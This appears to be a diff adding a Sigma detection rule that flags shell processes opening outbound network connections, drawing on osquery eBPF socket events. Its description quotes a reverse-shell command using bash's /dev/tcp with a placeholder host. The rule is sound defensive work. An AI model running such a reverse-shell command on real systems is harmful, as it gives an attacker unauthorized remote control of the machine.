@@ -1,0 +1,26 @@
+title: Shell Opened A Network Connection
+id: 5b5da29f-22bc-4f47-bc3e-f21b67b98f34
+status: experimental
+description: A shell process (bash, sh, dash, zsh) itself connected to a remote address (eBPF socket event).
+  Shells do not normally open sockets; this is the shape of a reverse shell such as bash -i >& /dev/tcp/host/port.
+author: samma-io
+level: high
+tags:
+- attack.execution
+- attack.command_and_control
+- attack.t1059.004
+logsource:
+  product: osquery
+  service: results
+detection:
+  selection:
+    name: samma_socket_events
+    columns.syscall: connect
+    columns.path|endswith:
+    - /bash
+    - /sh
+    - /dash
+    - /zsh
+  condition: selection
+falsepositives:
+- Scripts that use bash's /dev/tcp for health checks.
